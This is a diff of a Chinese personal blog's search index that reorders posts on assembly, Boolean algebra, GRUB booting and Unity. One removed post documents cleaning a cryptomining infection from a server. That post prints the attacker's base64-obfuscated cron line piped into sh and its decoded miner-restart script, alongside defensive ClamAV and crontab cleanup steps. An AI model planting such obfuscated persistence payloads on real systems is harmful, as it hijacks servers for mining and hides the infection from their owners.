@@ -1,6 +1,23 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>(A+B)(A+C)=A+BC如何逆推</title>
+    <url>/abacabc-ru-he-ni-tui/</url>
+    <content><![CDATA[<p>(A+B)(A+C)<br />
+=AA+AB+AC+BC<br />
+=AA+A(B+C)+BC<br />
+=A+A(B+C)+BC<br />
+=A(1+B+C)+BC<br />
+=A+BC</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>校内</category>
+        <category>计组</category>
+        <category>离散</category>
+      </categories>
+  </entry>
+  <entry>
     <title>2018 HCTF Warmup</title>
     <url>/2018-hctf-warmup/</url>
     <content><![CDATA[<p>打开题目出现滑稽图片</p>
@@ -32,23 +49,6 @@
       <tags>
         <tag>WP</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>(A+B)(A+C)=A+BC如何逆推</title>
-    <url>/abacabc-ru-he-ni-tui/</url>
-    <content><![CDATA[<p>(A+B)(A+C)<br />
-=AA+AB+AC+BC<br />
-=AA+A(B+C)+BC<br />
-=A+A(B+C)+BC<br />
-=A(1+B+C)+BC<br />
-=A+BC</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>校内</category>
-        <category>计组</category>
-        <category>离散</category>
-      </categories>
   </entry>
   <entry>
     <title>and esp, 0FFFFFFF0h的作用</title>
@@ -131,22 +131,6 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181101511
       </categories>
   </entry>
   <entry>
-    <title>指令集模仿设计笔记 (1) Call(E8)和Call(FF)</title>
-    <url>/calle8-he-callff/</url>
-    <content><![CDATA[<p>E8为near relative CALL,</p>
-<p>FF为absolute CALL</p>
-<p>前者Op/En基于D,操作数在机器码层面为signed Offset</p>
-<p>后者Op/En基于M</p>
-<p>这样就解决了CPU设计过程中两个重要问题:</p>
-<p>1.RELATIVE CALL的方向是如何确定的；答，操作数是有符号数</p>
-<p>2.如下代码是如何编译的；答， near relative CALL 00 00 00 00</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALL @F; </span><br><span class="line">@@:</span><br><span class="line">mov eax,eax;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>硬件</category>
-      </categories>
-  </entry>
-  <entry>
     <title>中断的必要性与有限状态机的关系</title>
     <url>/binary-articles-break-points-and-finite-state-machine/</url>
     <content><![CDATA[<h2 id="背景">背景</h2>
@@ -164,6 +148,70 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181101511
         <category>笔记</category>
         <category>存档</category>
       </categories>
+  </entry>
+  <entry>
+    <title>指令集模仿设计笔记 (1) Call(E8)和Call(FF)</title>
+    <url>/calle8-he-callff/</url>
+    <content><![CDATA[<p>E8为near relative CALL,</p>
+<p>FF为absolute CALL</p>
+<p>前者Op/En基于D,操作数在机器码层面为signed Offset</p>
+<p>后者Op/En基于M</p>
+<p>这样就解决了CPU设计过程中两个重要问题:</p>
+<p>1.RELATIVE CALL的方向是如何确定的；答，操作数是有符号数</p>
+<p>2.如下代码是如何编译的；答， near relative CALL 00 00 00 00</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALL @F; </span><br><span class="line">@@:</span><br><span class="line">mov eax,eax;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>硬件</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>分离声明和实现的关键性好处</title>
+    <url>/definition-declaration/</url>
+    <content><![CDATA[<h2 id="背景">背景</h2>
+<p>我觉得纠结这个问题的时间点太早或太晚都无法彻底理解这样做的好处，而笔者恰巧在一个不早不晚的时间点接触到了大型项目的开发，意识到了这样的好处</p>
+<h2 id="正文">正文</h2>
+<p>在进行unity客户端开发时，我注意到了这样的一种现象，如图</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181058120.png" /></p>
+<p>start函数被标为绿色</p>
+<p>OnMove函数仍为灰色</p>
+<p>其实原因便是unity早就声明好了start，<strong>就等着</strong>用户去写实现了</p>
+<p>而onMove函数并不是unity自带包的接口，没有事先声明，需要我们去写实现，然后后续才会调用，所以仍为灰色</p>
+<p>在巨型体量的项目当中</p>
+<p>接口暴露，同时实现交给第三方开发者自定义开发，也是很常见的一种做法</p>
+]]></content>
+      <categories>
+        <category>开发</category>
+        <category>GamePlay</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>DELL G5 BIOS 无法引导grub 解决办法</title>
+    <url>/dell-g5-bios-wu-fa-yin-dao-grub-jie-jue-ban-fa/</url>
+    <content><![CDATA[<p>气死了，折腾半天</p>
+<p>其实最终结果很简单，我简化一下外网搜到的解决方案</p>
+<p>简单来说就是，GRUB安装过程中的一项操作是定位GRUB的安装位置，然后告诉BIOS这是一项启动引导项，而不是普通的文件</p>
+<p>这步操作由于14版固件更新后出现了bug，而且最多只允许回退到15版固件驱动</p>
+<p>解决办法是</p>
+<p>第一步，跟着网上的教程正常安装你的双系统Linux，可以把系统安装在任何盘（Windows系统盘或者机械数据盘）</p>
+<p>第二步，安装完成后重启电脑，进去一次Windows，然后关机进BIOS</p>
+<p>第三步，BIOS那边有一个添加启动项的东西，打开来之后，可能会有点懵逼，别怕，首先把name一行写上GRUB（这个名称无所谓，些啥都可以）</p>
+<p>name下面有好几项奇奇怪怪的东西，那些都不用管放着就行，直接看下面的PATH路径栏</p>
+<p>在PATH栏的右边有三个点，打开来</p>
+<p>这时候就会进入磁盘的底层路径（磁盘不仅仅包括那些C,D,E,F盘当中的文件，还包括不会列出盘符的内容），这时候你只需要一个个找</p>
+<p>在这个页面的上面有个下拉选项，是用来选择磁盘区域的，如果看见了一些个人文件，就不要在那个磁盘区域找了，如果看见了很多底层文件就四处找找文件夹内容（根据Linux发行版名称），找到一个叫做grub的文件就行了</p>
+<p>双击这个文件就可以添加了</p>
+<p>然后再重启就可以用这个启动项了</p>
+<p>添加错了也不影响Windows的！要敢做！</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>存档</category>
+      </categories>
+      <tags>
+        <tag>环境配置</tag>
+      </tags>
   </entry>
   <entry>
     <title>二十五小时创造一门自然语言(用于魔幻类游戏)</title>
@@ -384,27 +432,6 @@ id="了解英语的句式结构确定造语的语序">了解英语的句式结�
       </categories>
   </entry>
   <entry>
-    <title>分离声明和实现的关键性好处</title>
-    <url>/definition-declaration/</url>
-    <content><![CDATA[<h2 id="背景">背景</h2>
-<p>我觉得纠结这个问题的时间点太早或太晚都无法彻底理解这样做的好处，而笔者恰巧在一个不早不晚的时间点接触到了大型项目的开发，意识到了这样的好处</p>
-<h2 id="正文">正文</h2>
-<p>在进行unity客户端开发时，我注意到了这样的一种现象，如图</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181058120.png" /></p>
-<p>start函数被标为绿色</p>
-<p>OnMove函数仍为灰色</p>
-<p>其实原因便是unity早就声明好了start，<strong>就等着</strong>用户去写实现了</p>
-<p>而onMove函数并不是unity自带包的接口，没有事先声明，需要我们去写实现，然后后续才会调用，所以仍为灰色</p>
-<p>在巨型体量的项目当中</p>
-<p>接口暴露，同时实现交给第三方开发者自定义开发，也是很常见的一种做法</p>
-]]></content>
-      <categories>
-        <category>开发</category>
-        <category>GamePlay</category>
-      </categories>
-  </entry>
-  <entry>
     <title>D触发器的使能端和清零端</title>
     <url>/d-hong-fa-qi-de-shi-neng-duan-he-qing-ling-duan/</url>
     <content><![CDATA[<h2 id="同步清零和异步清零">同步清零和异步清零</h2>
@@ -478,33 +505,6 @@ alt="owTkJ1.png" /></a></p>
       </categories>
   </entry>
   <entry>
-    <title>DELL G5 BIOS 无法引导grub 解决办法</title>
-    <url>/dell-g5-bios-wu-fa-yin-dao-grub-jie-jue-ban-fa/</url>
-    <content><![CDATA[<p>气死了，折腾半天</p>
-<p>其实最终结果很简单，我简化一下外网搜到的解决方案</p>
-<p>简单来说就是，GRUB安装过程中的一项操作是定位GRUB的安装位置，然后告诉BIOS这是一项启动引导项，而不是普通的文件</p>
-<p>这步操作由于14版固件更新后出现了bug，而且最多只允许回退到15版固件驱动</p>
-<p>解决办法是</p>
-<p>第一步，跟着网上的教程正常安装你的双系统Linux，可以把系统安装在任何盘（Windows系统盘或者机械数据盘）</p>
-<p>第二步，安装完成后重启电脑，进去一次Windows，然后关机进BIOS</p>
-<p>第三步，BIOS那边有一个添加启动项的东西，打开来之后，可能会有点懵逼，别怕，首先把name一行写上GRUB（这个名称无所谓，些啥都可以）</p>
-<p>name下面有好几项奇奇怪怪的东西，那些都不用管放着就行，直接看下面的PATH路径栏</p>
-<p>在PATH栏的右边有三个点，打开来</p>
-<p>这时候就会进入磁盘的底层路径（磁盘不仅仅包括那些C,D,E,F盘当中的文件，还包括不会列出盘符的内容），这时候你只需要一个个找</p>
-<p>在这个页面的上面有个下拉选项，是用来选择磁盘区域的，如果看见了一些个人文件，就不要在那个磁盘区域找了，如果看见了很多底层文件就四处找找文件夹内容（根据Linux发行版名称），找到一个叫做grub的文件就行了</p>
-<p>双击这个文件就可以添加了</p>
-<p>然后再重启就可以用这个启动项了</p>
-<p>添加错了也不影响Windows的！要敢做！</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>存档</category>
-      </categories>
-      <tags>
-        <tag>环境配置</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>原来这就是成人世界吗</title>
     <url>/fool/</url>
     <content><![CDATA[<p>自私不会被认为是自私,而是寡言内敛,不高调,值得信赖</p>
@@ -512,44 +512,6 @@ alt="owTkJ1.png" /></a></p>
       <categories>
         <category>黑历史与垃圾</category>
       </categories>
-  </entry>
-  <entry>
-    <title>按值传递与引用传递（Function pass by value vs. pass by reference译文）</title>
-    <url>/function-pass-by-value-vs-pass-by-reference/</url>
-    <content><![CDATA[<h2 id="背景">背景</h2>
-<p>之前写过一篇简单区分了一下指针变量和普通变量的区别</p>
-<p>后来发现自己还是太年轻了,在外网上面看见了这篇<a
-href="https://courses.washington.edu/css342/zander/css332/passby.html">文章(2)</a>
-感觉写的非常透彻,翻译一下作为笔记</p>
-<p><strong>(未经许可,此翻译禁止以任何形式转载,摘录,二次创作)</strong></p>
-<h2 id="阅读本文前置知识">阅读本文前置知识</h2>
-<ul>
-<li>了解栈帧与简单的汇编,编译原理有助于理解本文</li>
-<li>如果不了解的话建议看上面的文章(1)就行了</li>
-</ul>
-<h2 id="正文">正文</h2>
-<p>我们将传入函数的参数称为实参，将接受实参并被实参赋值的参数称为形参，他们统称为参数</p>
-<p>当我们向函数传递参数时，不同的调用方式导致的不同结果往往会令人困惑，与其称之为“规定”，不如去确切的了解一下不同调用方式在底层当中的具体细节。</p>
-<p>回想一下，当你调用一个函数时，一块栈将被划分为帧，这篇文章讨论的关键是此函数的帧当中保存形参和局部变量的情况</p>
-<p>根据定义，按值传递意味着函数将会在栈帧中开辟一段内存空间，用于储存实参的<strong>值</strong>的副本（译注：也就是所谓的<strong>保存现场</strong>），当你需要在函数当中使用这个参数时，你只会用到他的值的副本，而非使用其“原件”。当你只是需要<strong>暂时使用</strong>参数，而非<strong>在全局范围内更改参数的值</strong>时，请使用按值传递。</p>
-<p>而至于引用传递，则会在栈帧中开辟一段内存空间，用于储存实参的<strong>地址</strong>的副本，函数内任何对形参的操作会直接作用于实参本身（译注：地址虽然是副本，但是相同的地址指向相同的内存，<strong>实际上是同一个东西</strong>；而对于值的副本，不同的副本占据不同的内存空间，互不影响，<strong>实际上是不相干的东西</strong>），当需要<strong>在全局范围内更改参数的值</strong>传入的参数本身时，请使用引用传递</p>
-<p>（后面的例子并非原文例子，而是由译者给出
-由于笔者主要接触的是汇编语言,于是舍弃了原文当中的C++例子,采用此汇编例子,看不懂该例子的话可以去看一下原文的例子）</p>
-<p>按值传递：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov         dword ptr [i],1h  ；待使用的两个变量</span><br><span class="line">mov         dword ptr [j],2h </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push        ebp  ;生成栈帧</span><br><span class="line"> mov         ebp,esp  </span><br><span class="line"> sub         esp,0CCh  ;开辟内存空间</span><br><span class="line"> push        ebx  ;保存现场</span><br><span class="line"> push        esi  </span><br><span class="line"> push        edi  </span><br><span class="line"> lea         edi,[ebp-0CCh]  ;安全性填充</span><br><span class="line"> mov         ecx,33h  ;安全性填充</span><br><span class="line"> mov         eax,0CCCCCCCCh  ;安全性填充</span><br><span class="line"> rep stos    dword ptr es:[edi]  ;安全性填充</span><br><span class="line"> call swapThemByVal  ;调用函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">；swapThemByVal</span><br><span class="line"> mov         eax,dword ptr [num1]  ;复制值的副本到eax</span><br><span class="line"> mov         dword ptr [temp],eax </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [num2]  </span><br><span class="line"> mov         dword ptr [num1],eax  </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [temp]  </span><br><span class="line"> mov         dword ptr [num2],eax ;由于编译优化,并未存入新开辟的内存空间当中,而是直接存入eax</span><br><span class="line"></span><br><span class="line">mov eax ,0; 返回值</span><br><span class="line"> pop         edi  ;恢复现场</span><br><span class="line"> pop         esi  </span><br><span class="line"> pop         ebx  </span><br><span class="line"> add         esp,0CCh  </span><br><span class="line"> cmp         ebp,esp  </span><br><span class="line"> call        __RTC_CheckEsp   ;检查是否堆栈溢出</span><br><span class="line"> mov         esp,ebp  ;销毁变量,释放子栈帧,为返回父栈帧做准备</span><br><span class="line"> pop         ebp  ;恢复父栈帧</span><br><span class="line"> ret  ; 返回</span><br></pre></td></tr></table></figure>
-<p>引用传递：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea         eax,[j]  ;复制地址的副本</span><br><span class="line">push        eax  ;将副本入栈</span><br><span class="line">lea         ecx,[i]  ;同理</span><br><span class="line">push        ecx  </span><br><span class="line">push        ebp ;创建栈帧 </span><br><span class="line"> mov         ebp,esp  </span><br><span class="line"> sub         esp,0CCh  ;填充int3</span><br><span class="line"> push        ebx  </span><br><span class="line"> push        esi  </span><br><span class="line"> push        edi  </span><br><span class="line"> lea         edi,[ebp-0CCh]  </span><br><span class="line"> mov         ecx,33h  </span><br><span class="line"> mov         eax,0CCCCCCCCh  </span><br><span class="line"> rep stos    dword ptr es:[edi]  </span><br><span class="line">call        swapThemByRef </span><br><span class="line"></span><br><span class="line">;swapThemByRef </span><br><span class="line"></span><br><span class="line">mov         eax,dword ptr [num1]  ;复制地址的副本到eax</span><br><span class="line"> mov         ecx,dword ptr [eax]  ;eax当中存储的是地址,间接引用这个地址</span><br><span class="line"> mov         dword ptr [temp],ecx  </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [num1]  </span><br><span class="line"> mov         ecx,dword ptr [num2]  </span><br><span class="line"> mov         edx,dword ptr [ecx]  </span><br><span class="line"> mov         dword ptr [eax],edx  </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [num2]  </span><br><span class="line"> mov         ecx,dword ptr [temp]  </span><br><span class="line"> mov         dword ptr [eax],ecx  </span><br><span class="line"></span><br><span class="line"> mov         eax,0  ;返回值</span><br><span class="line"> pop         edi  </span><br><span class="line"> pop         esi  </span><br><span class="line"> pop         ebx  </span><br><span class="line"> add         esp,0CCh  </span><br><span class="line"> cmp         ebp,esp  </span><br><span class="line"> call        __RTC_CheckEsp (0BA129Eh)  </span><br><span class="line"> mov         esp,ebp  </span><br><span class="line"> pop         ebp  </span><br><span class="line"> ret  </span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>信息安全</category>
-        <category>二进制</category>
-        <category>杂谈</category>
-        <category>开发</category>
-        <category>C++</category>
-      </categories>
-      <tags>
-        <tag>cpp</tag>
-      </tags>
   </entry>
   <entry>
     <title>如何从_start函数跟到main函数</title>
@@ -629,9 +591,49 @@ https://i007it.com/2022/05/12/Hexo%E8%87%AA%E5%AE%9A%E4%B9%89%E9%A1%B5%E9%9D%A2%
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 123</span><br><span class="line">- 456</span><br></pre></td></tr></table></figure>
 <p>多标签写法，文章被分类到123、456以及123的自分类789这3个分类下面，官方指定写法。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line">   - [123]</span><br><span class="line">   - [456]</span><br><span class="line">   - [123, 789]</span><br></pre></td></tr></table></figure>
+<p>博客支持latex需要修改渲染器设置, 跟随该文章修改
+https://zhuanlan.zhihu.com/p/381508379</p>
 ]]></content>
       <tags>
         <tag>悬而未决</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>按值传递与引用传递（Function pass by value vs. pass by reference译文）</title>
+    <url>/function-pass-by-value-vs-pass-by-reference/</url>
+    <content><![CDATA[<h2 id="背景">背景</h2>
+<p>之前写过一篇简单区分了一下指针变量和普通变量的区别</p>
+<p>后来发现自己还是太年轻了,在外网上面看见了这篇<a
+href="https://courses.washington.edu/css342/zander/css332/passby.html">文章(2)</a>
+感觉写的非常透彻,翻译一下作为笔记</p>
+<p><strong>(未经许可,此翻译禁止以任何形式转载,摘录,二次创作)</strong></p>
+<h2 id="阅读本文前置知识">阅读本文前置知识</h2>
+<ul>
+<li>了解栈帧与简单的汇编,编译原理有助于理解本文</li>
+<li>如果不了解的话建议看上面的文章(1)就行了</li>
+</ul>
+<h2 id="正文">正文</h2>
+<p>我们将传入函数的参数称为实参，将接受实参并被实参赋值的参数称为形参，他们统称为参数</p>
+<p>当我们向函数传递参数时，不同的调用方式导致的不同结果往往会令人困惑，与其称之为“规定”，不如去确切的了解一下不同调用方式在底层当中的具体细节。</p>
+<p>回想一下，当你调用一个函数时，一块栈将被划分为帧，这篇文章讨论的关键是此函数的帧当中保存形参和局部变量的情况</p>
+<p>根据定义，按值传递意味着函数将会在栈帧中开辟一段内存空间，用于储存实参的<strong>值</strong>的副本（译注：也就是所谓的<strong>保存现场</strong>），当你需要在函数当中使用这个参数时，你只会用到他的值的副本，而非使用其“原件”。当你只是需要<strong>暂时使用</strong>参数，而非<strong>在全局范围内更改参数的值</strong>时，请使用按值传递。</p>
+<p>而至于引用传递，则会在栈帧中开辟一段内存空间，用于储存实参的<strong>地址</strong>的副本，函数内任何对形参的操作会直接作用于实参本身（译注：地址虽然是副本，但是相同的地址指向相同的内存，<strong>实际上是同一个东西</strong>；而对于值的副本，不同的副本占据不同的内存空间，互不影响，<strong>实际上是不相干的东西</strong>），当需要<strong>在全局范围内更改参数的值</strong>传入的参数本身时，请使用引用传递</p>
+<p>（后面的例子并非原文例子，而是由译者给出
+由于笔者主要接触的是汇编语言,于是舍弃了原文当中的C++例子,采用此汇编例子,看不懂该例子的话可以去看一下原文的例子）</p>
+<p>按值传递：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov         dword ptr [i],1h  ；待使用的两个变量</span><br><span class="line">mov         dword ptr [j],2h </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push        ebp  ;生成栈帧</span><br><span class="line"> mov         ebp,esp  </span><br><span class="line"> sub         esp,0CCh  ;开辟内存空间</span><br><span class="line"> push        ebx  ;保存现场</span><br><span class="line"> push        esi  </span><br><span class="line"> push        edi  </span><br><span class="line"> lea         edi,[ebp-0CCh]  ;安全性填充</span><br><span class="line"> mov         ecx,33h  ;安全性填充</span><br><span class="line"> mov         eax,0CCCCCCCCh  ;安全性填充</span><br><span class="line"> rep stos    dword ptr es:[edi]  ;安全性填充</span><br><span class="line"> call swapThemByVal  ;调用函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">；swapThemByVal</span><br><span class="line"> mov         eax,dword ptr [num1]  ;复制值的副本到eax</span><br><span class="line"> mov         dword ptr [temp],eax </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [num2]  </span><br><span class="line"> mov         dword ptr [num1],eax  </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [temp]  </span><br><span class="line"> mov         dword ptr [num2],eax ;由于编译优化,并未存入新开辟的内存空间当中,而是直接存入eax</span><br><span class="line"></span><br><span class="line">mov eax ,0; 返回值</span><br><span class="line"> pop         edi  ;恢复现场</span><br><span class="line"> pop         esi  </span><br><span class="line"> pop         ebx  </span><br><span class="line"> add         esp,0CCh  </span><br><span class="line"> cmp         ebp,esp  </span><br><span class="line"> call        __RTC_CheckEsp   ;检查是否堆栈溢出</span><br><span class="line"> mov         esp,ebp  ;销毁变量,释放子栈帧,为返回父栈帧做准备</span><br><span class="line"> pop         ebp  ;恢复父栈帧</span><br><span class="line"> ret  ; 返回</span><br></pre></td></tr></table></figure>
+<p>引用传递：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea         eax,[j]  ;复制地址的副本</span><br><span class="line">push        eax  ;将副本入栈</span><br><span class="line">lea         ecx,[i]  ;同理</span><br><span class="line">push        ecx  </span><br><span class="line">push        ebp ;创建栈帧 </span><br><span class="line"> mov         ebp,esp  </span><br><span class="line"> sub         esp,0CCh  ;填充int3</span><br><span class="line"> push        ebx  </span><br><span class="line"> push        esi  </span><br><span class="line"> push        edi  </span><br><span class="line"> lea         edi,[ebp-0CCh]  </span><br><span class="line"> mov         ecx,33h  </span><br><span class="line"> mov         eax,0CCCCCCCCh  </span><br><span class="line"> rep stos    dword ptr es:[edi]  </span><br><span class="line">call        swapThemByRef </span><br><span class="line"></span><br><span class="line">;swapThemByRef </span><br><span class="line"></span><br><span class="line">mov         eax,dword ptr [num1]  ;复制地址的副本到eax</span><br><span class="line"> mov         ecx,dword ptr [eax]  ;eax当中存储的是地址,间接引用这个地址</span><br><span class="line"> mov         dword ptr [temp],ecx  </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [num1]  </span><br><span class="line"> mov         ecx,dword ptr [num2]  </span><br><span class="line"> mov         edx,dword ptr [ecx]  </span><br><span class="line"> mov         dword ptr [eax],edx  </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [num2]  </span><br><span class="line"> mov         ecx,dword ptr [temp]  </span><br><span class="line"> mov         dword ptr [eax],ecx  </span><br><span class="line"></span><br><span class="line"> mov         eax,0  ;返回值</span><br><span class="line"> pop         edi  </span><br><span class="line"> pop         esi  </span><br><span class="line"> pop         ebx  </span><br><span class="line"> add         esp,0CCh  </span><br><span class="line"> cmp         ebp,esp  </span><br><span class="line"> call        __RTC_CheckEsp (0BA129Eh)  </span><br><span class="line"> mov         esp,ebp  </span><br><span class="line"> pop         ebp  </span><br><span class="line"> ret  </span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>信息安全</category>
+        <category>二进制</category>
+        <category>开发</category>
+        <category>杂谈</category>
+        <category>C++</category>
+      </categories>
+      <tags>
+        <tag>cpp</tag>
       </tags>
   </entry>
   <entry>
@@ -665,32 +667,8 @@ boot</p>
       <categories>
         <category>信息安全</category>
         <category>二进制</category>
-        <category>杂谈</category>
         <category>开发</category>
-      </categories>
-      <tags>
-        <tag>环境配置</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kubuntu zsh下刷新异常  出现白线</title>
-    <url>/kubuntu-zsh-white-line/</url>
-    <content><![CDATA[<p>新机器陪环境,配zsh之前使用系统自带的shell没有出现任何问题</p>
-<p>配置zsh前的显示设置为</p>
-<p>1080p 120Hz OpenGL3.1 全场景重画 缩放方法精确 总是保留窗口缩略图
-125%缩放</p>
-<p>本机默认为</p>
-<p>1080p 60Hz OpenGL2.0 自动垂直同步 缩放方法精确
-只对显示的窗口保留缩略图 100%缩放</p>
-<p>中文搜索没找到解决问题的办法,谷歌英文搜索 KDE zsh white lines</p>
-<p>第一个文章找到了解决思路</p>
-<p>这个文章的作者是ubuntu自己配了KDE环境,我这边是直接使用Kubuntu系统,细节上有所不同</p>
-<p>经过文章提示,禁止了小数缩放比例,改为100%缩放,后恢复正常</p>
-<p>记录如上</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>存档</category>
+        <category>杂谈</category>
       </categories>
       <tags>
         <tag>环境配置</tag>
@@ -719,48 +697,27 @@ section,while .plt is aproximately equal to TEXT section</p>
       </categories>
   </entry>
   <entry>
-    <title>ld-linux-x86-64 Linux矿机病毒</title>
-    <url>/ld-linux-x86-64-linux-virus/</url>
-    <content><![CDATA[<p>之前的站点被sql注入然后提权了,服务器直接失联,同时还被删库了...</p>
-<p>谨以此文记录</p>
-<h2 id="事发背景">事发背景</h2>
-<p>笔者部署了一个自动健康打卡程序(我只是GitHub的搬运工(doge))突然不打卡了,然后ssh上去看看情况,结果发现ssh上不去了,整个服务器直接失联,人都傻了</p>
-<p>直接重装服务器也并非一个明智的选择,因为所有备份数据需要ftp/ssh连上去服务器才可以开展</p>
-<p>姑且先尝试在阿里云后台点击服务器关机,结果关都关不了,无奈之下选择强制关机,然后重新开机,成功连接ssh(后续发现数据库文件已损坏)</p>
-<p>进去shell之后直接输入<code>top</code>命令</p>
-<p>看到了一个可疑进程占用率极高,而且在不断攀升,不一会就变成了90%+</p>
-<p>通过搜索进程名(ld-linux-x86-64)发现是个挖矿病毒</p>
-<h1 id="病毒细节">病毒细节</h1>
-<p>搜了一下发现变种比较多，这里讲一种个人感觉比较有意思的变种,说不定可以用来出一道密码学签到题23333</p>
-<p>大致思路为:利用管道符加密，解密病毒脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;something encrypted by base64&quot;  base64 -di  sh</span><br></pre></td></tr></table></figure>
-<p>echo的内容即为脚本病毒核心内容经base64加密(当然,也可以换成其他加密方式)后的字符串</p>
-<h1 id="杀毒">杀毒</h1>
-<p>病毒的变种比较多,网上有的文章是test用户下的文件是病毒的核心文件(test用户是攻击者提权之后创建的),而有的是mysql用户,方法不一,最终笔者找到了一个泛用性较好的方法</p>
-<p>在搜索的过程中,笔者首次了解到ClamAV这款Linux端开源杀毒软件，于是尝试使用其进行杀毒</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">#CentOS 8.2</span><br><span class="line">sudo dnf --enablerepo=extras install epel-release</span><br><span class="line">sudo dnf update -y</span><br><span class="line">yum install clamd -y</span><br><span class="line">freshclam</span><br><span class="line">service clamd start</span><br><span class="line">chkconfig clamd on</span><br><span class="line">clamscan -r / --move=/tmp</span><br></pre></td></tr></table></figure>
-<p>然后就会开始全盘扫描</p>
-<p>上述代码中,最后一行的<code>/</code>是扫描的目录范围，<code>--move</code>选项是移至隔离区</p>
-<p>扫描出来3个被感染的文件</p>
-<p>删除之后问题仍然存在,说明有个进程会监听并拉起病毒程序,经网上文章提示,查看了一下crontab任务清单</p>
-<p><code>crontab -l</code></p>
-<p>发现可疑进程,每1分钟执行一次,内容如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env bash</span><br><span class="line"></span><br><span class="line">echo &#x27;IyEvYmluL3NoCmlmIHRlc3QgLXIgL3NiaW4vaW5pdGN0MTsgdGhlbgpwaWQ9JChjYXQgL3NiaW4v</span><br><span class="line">aW5pdGN0MSkKaWYgJChraWxsIC1DSExEICRwaWQgPi9kZXYvbnVsbCAyPiYxKQp0aGVuCnNsZWVw</span><br><span class="line">IDEKZWxzZQpjZCAvc2JpbgouL21rZTNmcyAmPi9kZXYvbnVsbApleGl0IDAKZmkKZmkK&#x27;  base64 -di  sh</span><br></pre></td></tr></table></figure>
-<p>base64解密后内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">if test -r /sbin/initct1; then</span><br><span class="line">pid=$(cat /sbin/initct1)</span><br><span class="line">if $(kill -CHLD $pid &gt;/dev/null 2&gt;&amp;1)</span><br><span class="line">then</span><br><span class="line">sleep 1</span><br><span class="line">else</span><br><span class="line">cd /sbin</span><br><span class="line">./mke3fs &amp;&gt;/dev/null</span><br><span class="line">exit 0</span><br><span class="line">fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
-<p>删除该用户的所有crontab,然后再次全盘扫描即可</p>
-<p>但是攻击方究竟是如何注入进来的....</p>
-<p>限于目前笔者水平,看不懂Linux网络日志emmmm,只好作罢</p>
+    <title>Kubuntu zsh下刷新异常  出现白线</title>
+    <url>/kubuntu-zsh-white-line/</url>
+    <content><![CDATA[<p>新机器陪环境,配zsh之前使用系统自带的shell没有出现任何问题</p>
+<p>配置zsh前的显示设置为</p>
+<p>1080p 120Hz OpenGL3.1 全场景重画 缩放方法精确 总是保留窗口缩略图
+125%缩放</p>
+<p>本机默认为</p>
+<p>1080p 60Hz OpenGL2.0 自动垂直同步 缩放方法精确
+只对显示的窗口保留缩略图 100%缩放</p>
+<p>中文搜索没找到解决问题的办法,谷歌英文搜索 KDE zsh white lines</p>
+<p>第一个文章找到了解决思路</p>
+<p>这个文章的作者是ubuntu自己配了KDE环境,我这边是直接使用Kubuntu系统,细节上有所不同</p>
+<p>经过文章提示,禁止了小数缩放比例,改为100%缩放,后恢复正常</p>
+<p>记录如上</p>
 ]]></content>
       <categories>
-        <category>信息安全</category>
-        <category>二进制</category>
-        <category>杂谈</category>
+        <category>笔记</category>
+        <category>存档</category>
       </categories>
       <tags>
-        <tag>服务器</tag>
-        <tag>病毒</tag>
-        <tag>挖矿</tag>
+        <tag>环境配置</tag>
       </tags>
   </entry>
   <entry>
@@ -810,6 +767,51 @@ head节点和/或targetNode节点,同时将其置为<code>NULL</code></p>
         <category>校内</category>
         <category>数据结构</category>
       </categories>
+  </entry>
+  <entry>
+    <title>ld-linux-x86-64 Linux矿机病毒</title>
+    <url>/ld-linux-x86-64-linux-virus/</url>
